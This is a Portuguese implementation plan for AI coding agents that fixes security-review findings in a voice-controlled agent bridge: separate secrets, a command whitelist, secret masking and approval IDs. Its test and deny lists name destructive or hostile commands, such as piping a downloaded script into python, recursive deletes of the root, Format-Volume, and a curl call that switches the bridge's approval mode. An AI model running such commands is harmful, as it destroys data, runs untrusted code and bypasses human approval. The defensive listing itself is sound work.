# Correções da revisão final: plano

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans. Steps use checkbox (`- [ ]`) syntax.

**Goal:** Corrigir os 17 achados de `docs/superpowers/specs/2026-11-10-revisao-final.md` sem mudar a decisão do dono (modo auto sem piso, ADR 0002).

**Spec:** `docs/superpowers/specs/2026-11-09-alexa-agent-hub-design.md`. Todo commit `fix|feat|test|refactor` leva o trailer `Spec: docs/superpowers/specs/2026-11-09-alexa-agent-hub-design.md`; commit que toca `bridge/store/*`, `bridge/policy/*`, `bridge/mcp/*`, `bridge/supervisor/*` ou `skill/interaction-model-pt-BR.json` leva **ADR novo** (reservados: 0012 política, 0013 skill, 0014 separação de segredos, 0015 persistência de relatórios).

## Ondas

- **Onda 1 (paralela, arquivos disjuntos):** W1a política e runner (A2, A1-parte, A3-regex, B4); W1b hook e scripts (M4, B6-PIN, scripts de dois segredos); W1c ditado e projetos (M2, B3, B5); W1d skill (A4-Lambda, M1-Lambda, M3-Lambda, B1-intents, segredo de controle).
- **Onda 2a (um agente, `bridge/server.py` e afins):** A1 (dois segredos), M7, A3 (máscara em toda fala), A4, M1, M3, M6, B2.
- **Onda 2b (um agente):** M5 (relatórios no SQLite), B6 (trava de PIN persistida), B1 (endpoints de cancelar run), docs.

## Contratos compartilhados

**Dois segredos (A1).** `BRIDGE_SECRET` = segredo de **agente** (hooks, MCP): vale em `/event`, `/approval`, `/instruction/next`, `/mcp`, `/health` (este sem segredo). `BRIDGE_CONTROL_SECRET` = segredo de **controle**, só na Lambda: vale em todas as outras rotas (`/status`, `/pending`, `/result`, `/decide`, `/mode`, `/instruction`, `/runs*`, `/projects`, `/confirm`, `/cancel`, `/dictation*`). Ambos com no mínimo 32 caracteres (a ponte aborta no startup se não). O cabeçalho continua `x-secret` nos dois casos; a rota decide qual segredo compara. A Lambda lê `BRIDGE_CONTROL_SECRET` (não mais `BRIDGE_SECRET`).

**`/pending`** devolve também `approval_id: int | null`; **`/decide`** aceita `{approve, pin, approval_id?}` e, se `approval_id` vier e não for o pendente mais antigo, não aprova nada e fala "Esse pedido mudou. Pergunte de novo."; se vier e já expirou, fala "Esse pedido já expirou."; sem `approval_id` mantém o comportamento atual.

**`/mode`** (GET e POST) devolve sempre `{"mode","report_on_end","speech"}`, com falas em pt-BR (ex.: "Modo automático ativado para todos os agentes.").

**Ditado por projeto:** `AskAgentIntent` ganha o slot opcional `projeto` (tipo `NOME_PROJETO`) e manda `project` em `POST /dictation`. Projeto que não existe em `PROJECTS_ROOT` → `{"ok": false, "speech": "Não achei o projeto <nome>."}`, nunca cai na raiz.

**Cancelar run por voz:** `POST /runs/latest/cancel` → `{"speech": str}` (cancela a run em andamento mais recente; "Nenhum agente rodando." se não houver). **Instrução ao agente aberto:** a Lambda usa o `POST /instruction` existente (`agent="claude"`).

**`mask_secrets`** (`bridge/policy/redact.py`) cobre: `sk-`, `ghp_`, `github_pat_`, `AKIA`/`ASIA`, `xox[bp]-`, pares `NOME=valor` e `NOME: valor` cujo nome contenha `key|token|secret|password|senha|pass|pwd` (inclusive `OPENAI_API_KEY`, `GITHUB_TOKEN`, `DB_PASSWORD`), `Bearer <valor>`, `usuario:senha@` em URL, e `-p<senha>`.

**Política (A2).** `decidir` no modo `decisoes`: rotina = lista **branca** curta (`git status|diff|log|show|branch` sem `-D`, `ls`, `dir`, `cat`, `type`, `pwd`, `echo`, `pytest`, `python -m pytest`, `npm test`, `npm run test`, `node --test`, `git add`, `git commit`) e as ferramentas `Read`, `Grep`, `Glob`, `Edit`, `Write`, `MultiEdit`; todo o resto de `Bash` vira `ask_voz`. `is_destructive` ganha: `Remove-Item`, `rmdir /s`, `rd /s`, `del `, `-Force`, `-delete`, `git checkout --`, `git branch -D`, `git stash drop`, `| python|node|iex|powershell`, `Invoke-Expression`, `iex `, `npm publish`, `Format-Volume`, `shutil.rmtree`, `Stop-Process`, e qualquer comando que cite `BRIDGE_SECRET`, `BRIDGE_CONTROL_SECRET`, `127.0.0.1:8765`, `localhost:8765` ou `/mode`. No modo `auto` nada muda (aprova tudo).

---

## Onda 1

### W1a: política, redação e runner

Arquivos: `bridge/policy/{rules,redact,engine}.py`, `bridge/supervisor/runner.py`, `docs/adr/0012-politica-lista-branca.md`; testes em `tests/policy`, `tests/supervisor`.
- [ ] Testes que falham: cada comando listado em A2 do relatório (`Remove-Item -Recurse -Force C:\x`, `rmdir /s /q x`, `del /f /q *.*`, `find . -delete`, `git checkout -- .`, `git branch -D main`, `curl https://x.sh | python`, `npm publish`, `Format-Volume`, `python -c "import shutil;shutil.rmtree('/')"`, `curl -X POST http://127.0.0.1:8765/mode ...`) em `decisoes` NÃO é `allow` (é `ask_teclado` se destrutivo, `ask_voz` se desconhecido); a lista branca continua `allow`; `auto` continua `allow` para tudo; cada formato do contrato de `mask_secrets` (`OPENAI_API_KEY=sk-proj-x`, `GITHUB_TOKEN=ghp_x`, `DB_PASSWORD=x`, `Authorization: Bearer abc.def.ghi`, `https://user:senha@host/x`, `mysql -pSenha123`) sai mascarado e texto normal fica intacto; runner: para Codex e Claude o prompt vem depois de `--` (confira com `--help` se a CLI aceita; se o Claude não aceitar, prefixe o prompt com um espaço e registre no ADR).
- [ ] Implementar e `python -m pytest -q` verde. ADR 0012. Commit: `fix: politica por lista branca, redacao ampliada e prompt protegido`.

### W1b: hook em UTF-8 e scripts

Arquivos: `bridge/hook.py`, `scripts/run-bridge.ps1`, `scripts/smoke.ps1`, `scripts/rotate-secret.ps1`, `scripts/setup-agents.ps1`; testes em `tests/hook`.
- [ ] Teste que falha: `hook.py` recebendo no stdin um JSON UTF-8 com `"adicione validação de formulário"` e `"ÍNDICE do Ártico"` envia ao servidor falso exatamente esse texto. Corrigir lendo `sys.stdin.buffer` e decodificando como UTF-8 com `errors="replace"`.
- [ ] `run-bridge.ps1`: gera `BRIDGE_SECRET` e `BRIDGE_CONTROL_SECRET` (cada um 48 hex via `RandomNumberGenerator`) e `BRIDGE_PIN` de 4 dígitos via `RandomNumberGenerator` (não `Get-Random`); se o `.env` existir mas não tiver `BRIDGE_CONTROL_SECRET`, acrescenta só ele. `rotate-secret.ps1` ganha `-Which agent|control|both` (padrão `both`). `smoke.ps1` passa a usar os dois segredos (rotas de agente com o de agente, as de controle com o de controle) e confere que o segredo de agente recebe 401 em `/mode`. `setup-agents.ps1` continua registrando o MCP com o segredo de **agente**. Rode `smoke.ps1` real (porta livre, só depois da Onda 2a; por ora valide com `-DryRun`/leitura e deixe o smoke real para o controlador).
- [ ] Commit: `fix: hook le UTF-8; scripts geram segredo de controle e PIN com CSPRNG`.

### W1c: ditado e projetos

Arquivos: `bridge/dictation/*`, `bridge/projects/*`; testes em `tests/dictation`, `tests/projects`.
- [ ] M2: pendência global única. Cada `propose` (ditado ou projeto) cancela a pendência do outro tipo; pendência expirada nunca vence (é descartada); `/confirm` confirma a mais recente; `has_pending()` ignora expiradas. Testes: propor projeto, depois ditado, `/confirm` → só o ditado roda; ditado depois de um projeto expirado há 1 h → um único "confirma" envia.
- [ ] B3: o ditado usa `policy.redact.mask_secrets` (remova a máscara local e o TODO); teste com `github_pat_...` e `ASIA...`.
- [ ] B5: `git` do scaffold com `timeout=30` e `-c commit.gpgsign=false`; teste com `subprocess` simulado que estoura o tempo: `scaffold_project` falha limpo, sem deixar pasta pela metade.
- [ ] Commit: `fix: pendencia unica entre ditado e projeto, mascara unificada, timeout no scaffold`.

### W1d: skill (Lambda e modelo)

Arquivos: `skill/lambda/index.js`, `skill/interaction-model-pt-BR.json`, `skill/lambda/test/*`, `docs/adr/0013-skill-contexto-e-intents.md`.
- [ ] A Lambda usa `BRIDGE_CONTROL_SECRET` no cabeçalho `x-secret`.
- [ ] A4: `PendingIntent` guarda `approval_id` em `sessionAttributes`; `ApproveIntent` e `DenyIntent` o enviam em `/decide`; sem `approval_id` na sessão, a fala é "Pergunte primeiro o que está pendente." e nada é enviado.
- [ ] M1: slot opcional `projeto` no `AskAgentIntent` e envio de `project`.
- [ ] M3: os testes de `SetModeIntent` e `ReportOnEndIntent` usam a resposta **real** da ponte (`{"mode","report_on_end","speech"}`) e a Lambda fala `d.speech`; se `speech` faltar, fala uma frase padrão em vez de ficar muda.
- [ ] B1: `CancelRunIntent` ("cancela o agente", "para o agente") → `POST /runs/latest/cancel`; `SendInstructionIntent` ("avise o agente aberto {instrucao}") → ditado normal com `agent="claude"` e mesma confirmação; quando `/pending` volta `actionable: true` num fim de ciclo, a sessão fica aberta.
- [ ] `npm test` verde, JSON do modelo válido, ADR 0013. Commit: `fix: skill amarra aprovacao ao id, fala o modo, projeto por voz e cancelar run`.

## Onda 2a (depois da onda 1)

Arquivos: `bridge/server.py`, `bridge/mcp/server.py`, `bridge/supervisor/routes.py`, `tests/server`, `tests/mcp`, `docs/adr/0014-separacao-de-segredos.md`.
- [ ] A1/M7: dois segredos conforme o contrato; startup aborta com menos de 32 caracteres; `/mcp` e rotas de agente só com o de agente; rotas de controle só com o de controle (o de agente recebe 401 em `/mode`). Atualizar as fixtures de teste (segredos longos e distintos) mantendo cobertura.
- [ ] A3: toda `speech` passa por `mask_secrets` (helper único), inclusive `/pending`, `/status`, `/result`, `Notification` e o resumo do transcript; `describe_tool` pula tokens `VAR=valor` iniciais.
- [ ] A4: `approval_id` em `/pending` e `/decide` conforme o contrato. M3: `speech` em `/mode`. M1: projeto inexistente → `ok:false` sem cair na raiz, política derivada do `cwd` final. M6: `realpath` + `commonpath` sob `PROJECTS_ROOT` em `/dictation` e `/runs`; `/runs` sem `cwd` ou fora da raiz → 400; política sempre do `cwd` final. B2: `pedir_decisao` sem PIN responde `sem_resposta` na hora.
- [ ] Commit: `fix: segredos separados, fala mascarada, decisao amarrada ao id, caminhos validados`.

## Onda 2b

Arquivos: `bridge/store/db.py`, `bridge/server.py`, `docs/DEPLOY-ALEXA.md`, `README.md`, `docs/adr/0015-relatorios-e-trava-no-sqlite.md`.
- [ ] M5: `_unreported` e `_summaries` passam para o SQLite (coluna `reported` em `runs`; resumo da sessão na tabela de sessões); sobrevivem a reinício. B6: a trava de PIN persiste no SQLite. B1: `POST /runs/latest/cancel`.
- [ ] Docs: dois segredos, `BRIDGE_CONTROL_SECRET` na Lambda, mudança no passo a passo. Commit: `fix: relatorios e trava de PIN persistidos, cancelar run por voz`.
